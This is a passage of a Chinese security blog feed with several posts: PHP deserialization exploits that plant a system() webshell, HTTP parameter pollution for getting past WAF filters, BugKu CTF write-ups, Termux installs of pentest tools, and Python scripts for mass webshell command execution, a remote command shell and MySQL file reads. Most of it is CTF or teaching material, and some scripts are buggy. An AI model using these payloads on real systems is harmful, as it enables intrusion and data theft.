class="language-php">O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;;}</code></pre><p><img src="fangxuliehua5.jpg" alt="反序列化漏洞"></p><p>执行成功！</p><h3 id="其他Magic-function的利用">其他Magic function的利用</h3><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？并不是。然而类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p><pre><code class="language-php">class fangxuliehua_1{function __construct($test){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ;        fwrite($fp,$this-&gt;test);        fclose($fp);}}class fangxuliehua_2{public $test='test';function __wakeup(){     $obj=new fangxuliehua_1($this-&gt;test);    }}$class_get = $_GET['test'];print_r($class_get);echo &quot;&lt;/br&gt;&quot;;$class_get_unser = unserialize($class_get);include_once(&quot;webshell.php&quot;);//包含一下，让它能显示效果</code></pre><p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new fangxuliehua_1()会自动调用对象fangxuliehua_1中的__construct()方法，从而把<code>&lt;?php phpinfo() ?&gt;</code>写入到 webshell.php中。</p><pre><code class="language-php">O:14:&quot;fangxuliehua_2&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;}</code></pre><p><img src="fangxuliehua6.jpg" alt="调用wakeup"></p><h1 id="0x04-利用普通成员方法">0x04 利用普通成员方法</h1><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p><pre><code class="language-php">&lt;?phpclass itishead{public $test;function __construct(){$this-&gt;test= new itisbody();}function __destruct(){$this-&gt;test-&gt;action();}}class itisbody{function action(){echo &quot;hereisbody:)&quot;;}}class itisfoot{public $test2;function action(){eval($this-&gt;test2);}}$class = new itishead();unserialize($_GET['test']);?&gt;</code></pre><p>本意上，new一个新的itishead对象后，调用_construct()，其中又new了itisbody对象。在结束后会调用__destruct()，其中会调用action()，从而输出 itisbody。</p><p>利用代码:</p><pre><code class="language-php">&lt;?phpclass itishead {    var $test;    function __construct() {        $this-&gt;test = new itisfoot();    }}class itisfoot {    var $test2 = &quot;phpinfo();&quot;;}echo serialize(new itishead());?&gt;</code></pre><p>生成：</p><pre><code class="language-php">O:8:&quot;itishead&quot;:1:{s:4:&quot;test&quot;;O:8:&quot;itisfoot&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}}</code></pre><p>把payload传进去:</p><p><img src="fangxuliehua7.jpg" alt="利用成功截图"></p><p>利用成功！</p><blockquote><p>参考链接:<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈经典漏洞HTTP参数污染</title>
      <link href="/2019/09/24/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/09/24/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-问题由来">0x00 问题由来</h1><p>在先知社区看到一篇文章，从<strong>HTTP参数污染</strong>达成sql注入。</p><p>有点不理解HTTP参数污染是什么，于是就去翻了一些资料和看了视频过来总结一下。</p><a id="more"></a><h1 id="0x01-什么是HTTP常数污染">0x01 什么是HTTP常数污染</h1><p>HTTP参数污染，简单的来说就是给一个参数附上两个或者两个以上的value。对于不同的引擎引用的value会不同。</p><p><strong>假设:</strong></p><p>如果是jsp+tomcat 返回的请求是第一个value，</p><p>如果php+apache 返回的请求是第二个value，</p><p>如果是asp+iis 则会返回两个一起的value</p><h1 id="0x02-一些例子">0x02 一些例子</h1><h3 id="1-假设我们有一个网站http-hacker-net">1.假设我们有一个网站http://hacker.net/</h3><p><a href="http://hacker.net/search.php?page=10&amp;page=hacker" target="_blank" rel="noopener">http://hacker.net/search.php?page=10&amp;page=hacker</a></p><p>当服务器遇到同一个参数赋值不同数值时，会将他们连接起来，hacker可以通过这个方法来绕过黑名单例如</p><p><a href="http://hacker.net/search.php?page=select" target="_blank" rel="noopener">http://hacker.net/search.php?page=select</a> 1&amp;page=2,3,database()</p><p>不是在黑名单中的模式，不会触发黑名单的拦截功能，其次，由于web程序会采取连接操作，将前后的内容连接起来，SQL注入行为才能够被执行</p><h1 id="0x03-注入和HTTP参数污染有什么关系">0x03 注入和HTTP参数污染有什么关系</h1><p>如果该网站是采用两个一起的value一起返回，则可以用于Bypass WAF，也可以用于XSS.</p><p>最终取决于web服务器</p><h1 id="0x04-结尾">0x04 结尾</h1><p>经典的漏洞不代表现在没有，可以结合一些payload来达成过WAF。</p><p>tips:有点小乱。我看了也有点迷茫了xD</p><blockquote><p><strong>参考链接</strong>:<a href="https://v.qq.com/x/page/k0870cdqlsb.html" target="_blank" rel="noopener">https://v.qq.com/x/page/k0870cdqlsb.html</a></p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo插入图片问题的总结</title>
      <link href="/2019/09/18/Hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2019/09/18/Hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因:</h1><p>插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/</p><p><img src="io.png" alt="1"></p><a id="more"></a><h1 id="0x01-经过了一系列的测试找出了一下几个问题">0x01 经过了一系列的测试找出了一下几个问题:</h1><ul><li><p><strong>问题1</strong></p><p>Hexo版本以及插件不是最新</p><pre><code class="language-bash">hexo v</code></pre></li><li><p><strong>问题2</strong></p><p>没有用<code>hexo n &quot;string&quot;</code> 新增文章。</p></li><li><p><strong>问题3</strong></p><p>图片路径的**<code>斜杆</code>**问题 (<code>/</code>)正斜杆和( <code>\</code>)反斜杆,</p><p>如果图片是直接脱进Makedown，它会写路径的是反斜杆</p><pre><code>![]xx\xx.png</code></pre><p>会让hexo-asset-image插件 自动识别成，加一个名字</p><p>正常的：BugKuCTF/xx.png</p><p>错误的：BugKuCTF/BugKuCTFxx.png</p><p><img src="hexo.PNG" alt></p></li></ul><p>红色 是错的</p><p>蓝色 是对的</p><ul><li><p><strong>问题4</strong></p><p>如果在旧版本的Hexo安装过，hexo-asset-image 插件</p><p>那就需要重装一遍</p><pre><code class="language-bash">npm remove hexo-asset-imagenpm install hexo-asset-image --save</code></pre></li><li><p><strong>问题5</strong></p><p>这个问题我不知道是不是所有人都会。在makedown下，不区分路径大小写，在hexo上传后网页上区分大小写</p><p><img src="1.PNG" alt></p><h1 id="0x02-最直接最接地气解决问题的办法">0x02 最直接最接地气解决问题的办法</h1><p>就是去修改插件源代码</p><p>位置: node_modules\hexo-asset-image\index.js</p></li></ul><p><strong>tips: 这是我个人博客hexo插入图片时出错的问题,我用的Makedown是Typora，不同的主题有不一样的渲染图片路径的方式，根据不同的方式去修改插件代码。有能力可以自己写插件=w=</strong></p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonScript:Search_loaclNAS</title>
      <link href="/2019/06/20/%E6%9C%AC%E5%9C%B0NAS%E6%89%AB%E6%8F%8F/"/>
      <url>/2019/06/20/%E6%9C%AC%E5%9C%B0NAS%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>每次都会折腾一下实训室的 软路由。不是换linux就是坏掉机子，偶尔还忘记NAS配的固定IP。</p><p>所以写下了查找本地NAS脚本。</p><a id="more"></a><pre><code class="language-Python">import socketimport reimport threadingprint(&quot;&quot;&quot;[搜索本地NAS-Version 0.1]\n默认扫描最后一个网段1.1.1./24&quot;&quot;&quot;)host = input(&quot;本地IP&gt;&quot;)def searchNAS(i):    ip = host+str(i)    try:        Hostname = socket.gethostbyaddr(ip)        match = re.search(r'NAS-SERVER',str(Hostname)).group()        if match == &quot;NAS-SERVER&quot;:            print(&quot;NAS服务器IP地址为 &gt; {}:{}&quot;.format(match,ip))            pass    except:        passfor i in range(0,256):    t = threading.Thread(target=searchNAS,args=(i, ))    t.start()</code></pre><p>局域网内是DHCP会每天会更换IP，所以我打算就做了一个本地NAS的ip搜索器。方便自己找到存储服务器😗</p><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BugKuCTF】靶场部分writeup</title>
      <link href="/2019/05/20/BugKuCTF/"/>
      <url>/2019/05/20/BugKuCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>开始做一些CTF题目了。打算在高职比赛玩玩CTFxD</p><a id="more"></a><p>地址:<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">https://ctf.bugku.com/challenges</a></p><ul><li><h3 id="WEB篇"><strong>WEB篇</strong></h3><h4 id="web2">[<code>web2</code>]</h4><p>这种类型直接看源码 F12或者Ctrl+U</p><p><img src="web2.PNG" alt></p></li></ul><h4 id="计算器">[<code>计算器</code>]------------------------------------------------------</h4><p>试着算出来,然后发现只能输入一位数，就能猜测到他限制了长度，接着我们跑到F12里面去修改即可</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A81.png" alt="计算器1"></p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A82.PNG" alt="计算器2"></p><h4 id="web基础-GET">[<code>web基础$_GET</code>]------------------------------------------------------</h4><p>不解释，直接看代码</p><p><img src="$GET.PNG" alt="$GET"></p><p><img src="$get1.PNG" alt="$get1"></p><h4 id="web基础-POST">[<code>web基础$_POST</code>]------------------------------------------------------</h4><p>也不解释，直接看代码，需要用到抓包软件</p><p><img src="$POST.PNG" alt="$POST"></p><h4 id="矛盾">[<code>矛盾</code>]------------------------------------------------------</h4><p>先看代码</p><p><img src="%E7%9F%9B%E7%9B%BE.PNG" alt="矛盾"></p><p>问题出现在 <code>is_numeric</code> 这个函数,<code>is_numeric</code> 是判断 传入的字符串是否为数字。如果是则不输出,不是则输出<code>$num</code>。这个时候我们可以绕过这个函数。</p><p>他判断的是数字那么我们给他加点字符串 <code>?num=1a</code>，则绕过了第一个<code>if</code>判断，并跳到了第二个<code>if</code>判断。</p><p>然后他现在直接显示出了flag.</p><p><img src="%E7%9F%9B%E7%9B%BE2.PNG" alt="矛盾2"></p><h4 id="web3">[<code>web3</code>]---------------------------------------------------</h4><p>他会一直弹窗出来。不知道为什么我的Chrome不会跳出来。</p><p><img src="web3.png" alt="web3"></p><p>接着我们直接看源码F12  或者 Ctrl+U，发现最下面有一个被注释的html编码</p><p><img src="web3-1.PNG" alt="web3-1"></p><p>我的方法是，编写到文本，换html格式打开。</p><p><img src="web3-2.PNG" alt="web3-2"></p><p>解码就出来了.</p><h4 id="域名解析">[<code>域名解析</code>]-------------------------------------------------</h4><p><img src="%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.PNG" alt="域名解析"></p><p>修改hosts访问 flag.baidu.com即可.</p><ul><li><p>hosts位置</p><p>windows：</p><p>C:\Windows\System32\drivers\etc</p><p>linux:</p><p>/etc/hosts</p></li></ul><h4 id="你必须让他停下来">[<code>你必须让他停下来</code>]--------------------------------------------</h4><p>打开网址发现他一直刷新。二话不说直接上Burpsuite抓包，并放到Repeater(Ctrl+R)。</p><p>多Go几遍就能看到flag了</p><p><img src="%E5%81%9C%E4%B8%8B%E6%9D%A5.PNG" alt="停下来"></p><h4 id="本地文件包含">[<code>本地文件包含</code>]--------------------------------------------------</h4><p><strong>网站进不去。放弃.</strong></p><h4 id="变量1">[<code>变量1</code>]------------------------------------------------------</h4><p>先看审计代码，发现最下面有两个$$args</p><p><img src="%E5%8F%98%E9%87%8F1.PNG" alt="变量1"></p><p>$$   容易引发变量覆盖</p><p>思考。我们直接让他全部值显示出来。使用全局变量<code>$GLOBALS</code></p><p>我们直接给他 全局变量<code>$GLOBALS</code>传参进去,args=GLOBALS</p><p>tips:关于全局变量https://www.runoob.com/php/php-superglobals.html</p><p><img src="%E5%8F%98%E9%87%8F1-2.PNG" alt="变量1-2"></p><h4 id="web5">[<code>web5</code>]----------------------------------------------------</h4><p>输入字符串,啥东西都没有</p><p><img src="web5.PNG" alt="web5"></p><p>直接看看源码F12 或者 Ctrl+U</p><p><img src="web5-1.PNG" alt="web5-1"></p><p>发现这一串看不懂的编码。这种编码是JSFUCK属于一直 加密方式</p><p>tips:原理<a href="https://blog.csdn.net/qq_36539075/article/details/79946099" target="_blank" rel="noopener">https://blog.csdn.net/qq_36539075/article/details/79946099</a></p><p>直接F12在Console里粘贴</p><p><img src="web5-2.PNG" alt="web5-2"></p><h4 id="头等舱">[<code>头等舱</code>]------------------------------------------------------</h4><p>什么也没有。</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B1.PNG" alt="头等舱"></p><p>在看下头等舱。就能猜测到他flag肯定在 请求头那边，于是直接上抓包软件，并GO一遍看看</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B11.PNG" alt="头等舱1"></p><p>拿到flag！</p><h4 id="网站被黑">[<code>网站被黑</code>]------------------------------------------------------</h4><p>打开网站。好炫啊。还会跟着鼠标动，好！偷代码下来了</p><p><img src="webshell1.PNG" alt="webshell1"></p><p>啥也没提示。直接上御剑扫描找到一个。<strong>shell的路径</strong> 123.206.87.240:8002/webshell/shell.php</p><p><img src="webshell2.PNG" alt="webshell2"></p><p>二话不说直接上爆破Burp Suite</p><p><img src="webshell3.PNG" alt="webshell3"></p><p>输入上去</p><p><img src="20180813135625263.png" alt="20180813135625263"></p><p>GET到flag</p><h4 id="管理员系统"><strong>[<code>管理员系统</code>]------------------------------------------------------</strong></h4><p>打开发现是一个登入界面。尝试使用SQL万能密码登入</p><p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="捕获"></p><p>失败了。IP被禁止访问。</p><p><img src="%E6%8D%95%E8%8E%B71.PNG" alt="捕获1"></p><p>于是打开抓包软件在请求头上添加上**<code>X-Forwarded-For 127.0.0.1</code>**</p><p>再试试万能密码</p><p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="捕获2"></p><p>密码错误。那么我们来看看源码F12</p><p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="捕获3"></p><p>看到源码中有一个被注释的base64的编码。于是解密出来看是<strong>test123</strong>那么用户名是**<code>admin</code><strong>密码是</strong><code>test123</code>**</p><p><strong>tips:不定时更新。每更新十个题目</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Web-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Termux安装笔记</title>
      <link href="/2019/02/02/Termux%E5%AE%89%E8%A3%85/"/>
      <url>/2019/02/02/Termux%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记</p><a id="more"></a><ul><li><p><strong>科学上网</strong></p><ol><li><p>在Github上搜索ShadowsocksR</p><p>(<a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="noopener">https://github.com/shadowsocksr-backup/shadowsocksr-android/releases</a>)</p></li><li><p>赛风</p></li></ol></li><li><p><strong>Termux下载地址</strong></p><ol><li>Google商城(要借助科学上网)</li><li>酷安</li></ol></li><li><p><strong>Termux更改源</strong></p><ul><li><p>自动更换指令</p><pre><code class="language-shell">sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list</code></pre></li><li><p>手动修改</p><p>​编辑 <code>$PREFIX/etc/apt/sources.list</code> 修改为如下内容</p><pre><code class="language-shell"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre></li></ul><p>并更新pkg up / apt update</p><p>两种方法安装metasploit</p></li><li><p><strong>两种方法安装metasploit</strong></p><ul><li>第一种</li></ul><pre><code class="language-bash">pkg install metasploit</code></pre><p><strong>一路默认安装</strong></p><ul><li><p>第二种</p><pre><code class="language-bash">apt install wgetwget https://Auxilus.github.io/metasploit.shsh metasploit.shpkg install metasploit</code></pre></li></ul><pre><code>    </code></pre></li><li><p><strong>Termux安装一些Python必要的库</strong></p><pre><code class="language-bash">pkg install python python-dev python2 python2-dev</code></pre></li><li><p><strong>Termux安装一些常用的辅助工具</strong></p><pre><code class="language-bash">pkg install git curl</code></pre></li><li><p><strong>美化Termux</strong></p><ul><li><p>oh-my-zsh的安装</p><pre><code class="language-bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>一步到位，后面自己选择主题和颜色</p></li></ul></li><li><p><strong>Termux安装nmap</strong></p><pre><code class="language-bash">pkg install nmap</code></pre></li><li><p><strong>Termux安装SQLMap</strong></p><pre><code class="language-bash">apt install python2 gitgit clone https://github.com/sqlmapproject/sqlmap</code></pre></li></ul><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【转载】黑苹果安装笔记</title>
      <link href="/2018/12/15/BlackApple/"/>
      <url>/2018/12/15/BlackApple/</url>
      
        <content type="html"><![CDATA[<h2>上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10</h2><a id="more"></a><pre><code>我要总结的转载的简书都。。帮我一起总结了，所以我就懒的写了 嘻嘻        要点:        1、两系统共存则磁盘必须是GPT格式        2、安装mac要用适合机型的EFI文件和相应的安装配置，特别是显卡驱动&lt;br&gt;        3、安装完以后要把mac和win完整的EFI文件合并到一起并且放入电脑安装时自动分好的EFI分区内&lt;br&gt;        4 、用clover挂载好所有的电脑内EFI引导文件（即mac 和 win的）        简略步骤:        远景：从GPT(GUID) 分区开始,EasyUEFI 双系统安装详解(install.wim + mac10.12.5)这是win7+mac10.12的帖子，比较复杂，可以看看，了解EFI分区。win10+mac10.12 直接看12楼的回复就可以了&lt;br&gt;        分区：PE下分一个ESP ，二个NT&lt;br&gt;        安装MAC：u盘安装        安装win10：PE下安装WIN的WIM镜像，在软件里选对系统分区，启动分区，引导类型        EFI引导：装好WIN后，COPY CLOVER进ESP，就完事了        把Mac efi里面CLOVER文件夹放到esp分区的efi文件夹里，然后用easyuefi添加EFI/CLOVER/CLOVERX64.efi引导        在此之前需要的准备：        硬件方面：        一台i7-7700k + Gigabyte Z270X-Gaming5 台式机        最好有一台可用的mac        2个以上空的8G或以上的U盘        软件方面：        准备好mac 10.11.3镜象        准备好在win上制作mac镜象的工具：transmac(自行百度）或者mac上制作mac镜像的工具：Unibeast        准备好在mac上挂载EFI分区的工具：Clover Configurator       BIOS设置：        启动方式：UEFI        硬盘模式：ACHI        家伙事准备得差不多了我们就可以开始了。        一、首先制作mac系统安装盘        1 win系统：在win里下载好mac 10.12系统并安装好transmac        2 Mac 系统：下载macOS Sierra 10.12 并安装Unibeast，制作mac安装盘        二、制作win10系统安装盘        三、安装mac，我们要实现mac和win10同时存在，并要双引导，所以必须要uefi引导方式，而win10要uefi引导就必须装在GPT格式的磁盘上，所以，首先，必须将磁盘设置为GPT格式，所以先用win10的系统盘插入电脑，开机，进入安装界面，在选择装在哪个盘的时候点击shift F10，然后在dos里操作，具体操作不再此说明       设置磁盘格式为GPT以后，退出windows安装，我们先还是安装mac 的，把我们做好的mac系统盘插入电脑，开机，按F7，用U盘引导，选择install OS X EI Capitan,按照提示一步一步安装完成即可，大概20-25分钟，取决于你的U盘速度。这里有个分区的问题，你想给mac多少空间，就多少，其它的不用创建分区，等windows创建即可，我128固态给mac40G。之后mac安装完成        四、安装完成后，关机，插入 win7系统盘，同样UEFI安装用U盘引导，安装在ssd剩下的空间里，没有什么好说的。&lt;br&gt;这个时候windows和mac都安装好了，但是这个时候你拨掉U盘开机会发现直接进入了win10系统，说好的选择呢？ 不急，我们mac的efi也还没有替换呢。       五、处理电脑EFI分区：首先，用U盘引导，进入mac,同时用工具挂载电脑和系统盘两个EFI分区，并把EFI文件夹删除，把我们下载好的EFI文件夹分别放进去，不做作何处理，就是说现在电脑里有mac需要的配置、驱动等都有了，关机，拨掉U盘，开机，进入win10系统，在win10下同样挂载电脑EFI分区，怎么挂载呢？， 插入win10的系统盘，把里边的efi文件夹里边的内容替换进去（注意是内容替换，不是把原来的efi删除，把这个放进去，因为原来的efi里边已经有mac的启动文件了）        替换完了后，关机，拨掉win10系统盘，插入mac系统盘，开机，按F7,用U盘引导，在clover界面先择 boot option ,先择第一个挂载所有引导，忘了具体是什么了，大概是这个意思，如果你发现右下角的clover版本号变了，就成功了，这个时候restart，拨掉U盘，开机应该自动到clover选择界面，可以选择作意系统了。此时mac和win10双引导基本完成。        接下来就是安装各种驱动和完善了</code></pre><blockquote><p><strong>参考</strong>:<a href="https://www.jianshu.com/p/5db38511cc73" target="_blank" rel="noopener">https://www.jianshu.com/p/5db38511cc73</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一周8个精选文章:第一章</title>
      <link href="/2018/12/05/Daily01/"/>
      <url>/2018/12/05/Daily01/</url>
      
        <content type="html"><![CDATA[<blockquote><a id="more"></a><p>从外网到内网的渗透姿势分享 : <a href="https://xz.aliyun.com/t/5330" target="_blank" rel="noopener">https://xz.aliyun.com/t/5330</a></p><p>基于EVE-NG平台上构建企业内网攻防环境 : <a href="https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA</a></p><p>PHP 函数漏洞总结 : <a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/60968595</a></p><p>CTF Training 经典赛题复现环境: <a href="https://github.com/CTFTraining/CTFTraining" target="_blank" rel="noopener">https://github.com/CTFTraining/CTFTraining</a></p><p>RemTeam攻击技巧和安全防御 : <a href="https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/)" target="_blank" rel="noopener">https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/)</a></p><p>盘点那些渗透测试中的奇淫技巧: <a href="https://paper.seebug.org/92/" target="_blank" rel="noopener">https://paper.seebug.org/92/</a></p><p>APT34工具 :<a href="https://github.com/p3pperp0tts/APT34" target="_blank" rel="noopener">https://github.com/p3pperp0tts/APT34</a></p><p>CTF线下攻防指南 : <a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/" target="_blank" rel="noopener">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p></blockquote><p><em><strong>转载请标明出处</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PythonScript】:WebShell</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
      
        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PythonScript】:Web_Dirs_Scnnaer</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>看到一些web目录扫描器。自己也尝试写了一下xD</p><a id="more"></a><pre><code class="language-Python">import requestsimport randomimport reuser_agent_list = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'},]user_agent = random.choice(user_agent_list)target = input(&quot;target host &gt;&quot;)dict_path_file = input(&quot;dicr file &gt;&quot;)def CheckURLProtocol():    Check = re.match(r&quot;http?://&quot;,target)    if Check == None:        print(&quot;[-]Example: http://127.0.0.1 or https://127.0.0.1&quot;)        exit(0)    else:        with open(dict_path_file) as f:            for dic in f.readlines():                url = target + str(dic)                url = url.replace(&quot;\n&quot;,&quot;&quot;)                try:                    r = requests.get(url,headers=user_agent)                    if r.status_code == 200:                        print(r.url)                except:                    pass</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PythonScript】:RemoteSocket_cmd</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><a id="more"></a><ul><li><strong>Server:</strong></li></ul><pre><code class="language-Python">import socket,osdef main():    global data, s    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind(('127.0.0.1',10001))    s.listen(5)    print(&quot;等待连接中……&quot;)    while True:        conn,addr = s.accept()        while True:            print('收到命令')            data = conn.recv(1024)            cmd = os.popen(data.decode())            os_result = cmd.read()            conn.sendall(os_result.encode('utf8'))if __name__ == '__main__':    main()</code></pre><ul><li><strong>Client:</strong></li></ul><pre><code class="language-Python">import  socketServerIP=('127.0.0.1',10001)try:    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)    s.connect(ServerIP)    print('[+]连接成功')except:    print('[-]服务器无响应')    exit(0)while True:    data=input('[CMD]&gt;&gt;')    s.sendto(bytes(data,encoding='utf8'),ServerIP)    data = s.recv(1024)    print('[+]回显成功')    print(data.decode())</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PythonScript】:PyMySQL</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PythonScript】:PortScanner</title>
